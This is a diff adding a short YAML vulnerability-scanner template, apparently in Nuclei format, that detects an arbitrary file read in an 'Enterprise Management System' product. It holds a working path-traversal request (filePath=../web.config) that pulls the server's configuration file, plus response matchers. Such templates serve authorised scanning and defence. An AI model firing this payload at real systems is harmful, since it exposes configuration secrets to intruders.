@@ -1,0 +1,24 @@
+id: enterprise-management-system-getcssfile-anyfile-read
+info:
+  name: Enterprise Management System GetCssFile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Utility/GetCssFile?filePath=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "web.config"
+        part: body
+      - type: word
+        words:
+          - "text/css"
+        part: header
